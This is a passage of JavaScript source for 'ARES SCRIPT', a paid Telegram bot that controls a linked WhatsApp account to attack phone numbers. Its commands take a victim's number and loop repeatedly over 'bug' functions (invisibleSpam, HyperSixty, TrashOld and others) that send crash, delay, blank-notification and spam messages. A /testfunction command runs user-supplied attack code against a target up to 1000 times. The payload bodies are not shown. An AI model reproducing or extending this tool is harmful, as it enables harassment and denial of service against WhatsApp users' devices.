  await ctx.answerCbQuery().catch(() => {});

  const senderStatus = isWhatsAppConnected ? "1" : "0";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const displayName =
    ctx.from?.first_name ||
    ctx.from?.username ||
    "User";

  const menuMessage = `
\`\`\`js
╭━━〔 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 〕━━━⬣
│✦ Developer : @yannxbrutt
│✦ Version : 2.0 Stable
│✦ Status : Premium Access
╰━━━━━━━━━━━━━━━━━━⬣

╭━〔 PRICE INFORMATION 〕━⬣
│✦ Official Price : Rp 30.000
│✦ Reseller Price : Rp 60.000
│✦ Type : / Slash
╰━━━━━━━━━━━━━━━━━━━⬣

╭━━━〔 BOT STATUS 〕━━━⬣
│✦ Sender : ${senderStatus}
│✦ Runtime : ${runtimeStatus}
│✦ Memory : ${memoryStatus}
│✦ Cooldown : ${cooldownStatus}
│✦ Username : ${displayName}
╰━━━━━━━━━━━━━━━━━━━━⬣
\`\`\``;

  const keyboard = [
    [
      { text: "Settings", callback_data: "/controls", style: "primary" },
      { text: "Murbug", callback_data: "/bug", style: "danger" }
    ],
    [
      { text: "Support", callback_data: "/tqto", style: "success" }
    ],
    [
      { text: "Owners", url: "https://t.me/yannxbrutt", style: "primary" }
    ]
  ];

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: thumbnailUrl,
        caption: menuMessage,
        parse_mode: "Markdown"
      },
      {
        reply_markup: { inline_keyboard: keyboard }
      }
    );
  } catch (err) {
    await ctx.editMessageCaption(menuMessage, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    }).catch(() => {});
  }
});


// ================== CONTROLS MENU (/controls) ==================
bot.action('/controls', async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});

  const controlsMenu = `
\`\`\`js
╭═───⊱ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ───═⬡
│ ⸙ Developer: @yannxbrutt
│ ⸙ Version: 2.0
╰═─────────────═⬡

╭═───⊱ BOT COMMAND ───═⬡
│⸙ /addgroup - Added Prem Group
│⸙ /delgroup - Delete Premium Group
│⸙ /listgroup - List Group
│⸙ /connect - Added Number
│⸙ /setcd - Setting Cooldown Bug
│⸙ /resetbot - Delete Sessions Bug
╰═─────────────═⬡
\`\`\``;

  const keyboard = [
    [{ text: "⌜🔙⌟ Back to Main Menu", callback_data: "/start", style: "primary" }]
  ];

  await ctx.editMessageCaption(controlsMenu, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: keyboard }
  }).catch(() => {});
});

bot.action('/bug', async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});

  const bugMenu = `
\`\`\`js
⬡═―—⊱ ⎧ 𝔹𝕌𝔾 𝕄𝔼ℕ𝕌 ⎭ ⊰―—═⬡
⌑ /xcloris - Delay
⌑ /zlox - Notification Blank
⌑ /testfunction - Use Your Function
⌑ /xsixty - Murbug Spam
⌑ /hypersix - Invisible iPhone
\`\`\``;

  const keyboard = [
    [{ text: "➡️ Next Bug", callback_data: "/nextbug", style: "primary" }],
    [{ text: "⌜🔙⌟ Back to Main Menu", callback_data: "/start", style: "danger" }]
  ];

  await ctx.editMessageCaption(bugMenu, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: keyboard }
  }).catch(() => {});
});


// ================== NEXT BUG PAGE==================
bot.action('/nextbug', async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});

  const nextBug = `
\`\`\`js
⌑ /hypersix - Invisible iPhone
\`\`\`
  `.trim();

  const keyboard = [
    [{ text: "⌜🔙⌟ Kembali ke Menu Utama", callback_data: "/start", style: "danger" }]
  ];

  await ctx.editMessageCaption(nextBug, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: keyboard }
  }).catch(() => {});
});

bot.action('/tqto', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});

    const tqtoMenu = `
\`\`\`js
⬡═―—⊱ ⎧ THANKS TO ⎭ ⊰―—═⬡
⌑ @yannxbrutt - The Developer
⌑ @Xatanicvxii - Support
\`\`\``;

    const keyboard = [
        [{ text: "⌜🔙⌟ Back to Main Menu", callback_data: "/start", style: "success" }]
    ];

    await ctx.editMessageCaption(tqtoMenu, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
    }).catch(() => {});
});

bot.command("xcloris", checkWhatsAppConnection, async (ctx) => {

    if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdeath 62×××`);
  
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Delay
⌑ Status: Initializing…
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  const bars = [
    "▰▱▱▱▱▱▱▱▱▱",
    "▰▰▱▱▱▱▱▱▱▱",
    "▰▰▰▱▱▱▱▱▱▱",
    "▰▰▰▰▱▱▱▱▱▱",
    "▰▰▰▰▰▱▱▱▱▱",
    "▰▰▰▰▰▰▱▱▱▱",
    "▰▰▰▰▰▰▰▱▱▱",
    "▰▰▰▰▰▰▰▰▱▱",
    "▰▰▰▰▰▰▰▰▰▱",
    "▰▰▰▰▰▰▰▰▰▰"
  ];

  const spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"];

  for (let i = 0; i < bars.length; i++) {
    const percent = (i + 1) * 10;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Delay
⌑ Status: Sending ${spinner[i % spinner.length]}
⌑ Progress:
${bars[i]}  ${percent}%
\`\`\``,
      { parse_mode: "Markdown" }
    );

    await sleep(350);
  }
  for (let i = 0; i < 100; i++) {
    await CStatus(sock, target);
    await TrashOld(target);
    await btnStatus(target);
    await invisibleSpam(sock, target);
    await sleep(1000);
  }
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Delay
⌑ Status: Success
\`\`\``,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("hypersix", checkWhatsAppConnection, async (ctx) => {

    if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /hypersix 62×××`);
  
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Iphone
⌑ Status: Initializing…
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  const bars = [
    "▰▱▱▱▱▱▱▱▱▱",
    "▰▰▱▱▱▱▱▱▱▱",
    "▰▰▰▱▱▱▱▱▱▱",
    "▰▰▰▰▱▱▱▱▱▱",
    "▰▰▰▰▰▱▱▱▱▱",
    "▰▰▰▰▰▰▱▱▱▱",
    "▰▰▰▰▰▰▰▱▱▱",
    "▰▰▰▰▰▰▰▰▱▱",
    "▰▰▰▰▰▰▰▰▰▱",
    "▰▰▰▰▰▰▰▰▰▰"
  ];

  const spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"];

  for (let i = 0; i < bars.length; i++) {
    const percent = (i + 1) * 10;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Iphone
⌑ Status: Sending ${spinner[i % spinner.length]}
⌑ Done sending bug
${bars[i]}  ${percent}%
\`\`\``,
      { parse_mode: "Markdown" }
    );

    await sleep(350);
  }
  for (let i = 0; i < 100; i++) {
    await HyperSixty(target);
    await HyperSixty(target);
    await sleep(1000);
  }
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Iphone
⌑ Status: Success
\`\`\``,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("zlox", checkWhatsAppConnection, async (ctx) => {

    if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /zlox 62×××`);
  
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Notifikasi
⌑ Status: Initializing…
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
  const processMessageId = processMessage.message_id;
  const bars = [
    "▰▱▱▱▱▱▱▱▱▱",
    "▰▰▱▱▱▱▱▱▱▱",
    "▰▰▰▱▱▱▱▱▱▱",
    "▰▰▰▰▱▱▱▱▱▱",
    "▰▰▰▰▰▱▱▱▱▱",
    "▰▰▰▰▰▰▱▱▱▱",
    "▰▰▰▰▰▰▰▱▱▱",
    "▰▰▰▰▰▰▰▰▱▱",
    "▰▰▰▰▰▰▰▰▰▱",
    "▰▰▰▰▰▰▰▰▰▰"
  ];

  const spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"];

  for (let i = 0; i < bars.length; i++) {
    const percent = (i + 1) * 10;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Notifikasi
⌑ Status: Sending ${spinner[i % spinner.length]}
⌑ Progress:
${bars[i]}  ${percent}%
\`\`\``,
      { parse_mode: "Markdown" }
    );

    await sleep(350);
  }
  for (let i = 0; i < 100; i++) {
    await cslz(sock, target);
    await noticeGz(sock, target);
    await viclxz(sock, target);
    await sleep(1000);
  }
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Notifikasi
⌑ Status: Success
\`\`\``,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("xsixty", checkWhatsAppConnection, async (ctx) => {
const q = ctx.message?.text?.split(" ")[1];
if (!q) return ctx.reply("🪧 ☇ Format: /xsixty 62×××");

let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target   : ${q}
⌑ Result   : Delivered
⌑ Effect   :
• Delay Invisible
• Bebas Spam
• Hard Invisible
⌑ Status   : Success
\`\`\``,
{ 
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [[
      { text: "⌜📱⌟ Target", url: `https://wa.me/${q}`, style: "Success" }
    ]]
  }
}
);

for (let i = 0; i < 100; i++) {
await CStatus(sock, target);
await TrashOld(target);
await btnStatus(target);
await invisibleSpam(sock, target);
}

await ctx.telegram.editMessageText(
ctx.chat.id,
processMessage.message_id,
undefined,
`\`\`\`js
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target   : ${q}
⌑ Result   : Delivered
⌑ Effect   :
• Delay Invisible
• Bebas Spam
• Hard Invisible
⌑ Status   : Success
\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [[
      { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}`, style: "Success" }
    ]]
  }
}
);
});

bot.command("testfunction", checkWhatsAppConnection, async (ctx) => {
if (!await validatePremiumGroup(ctx)) return;
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `
\`\`\`js
 ⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
\`\`\``,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `
\`\`\`JS
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
\`\`\``
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

//Function
// END Dek
bot.launch()
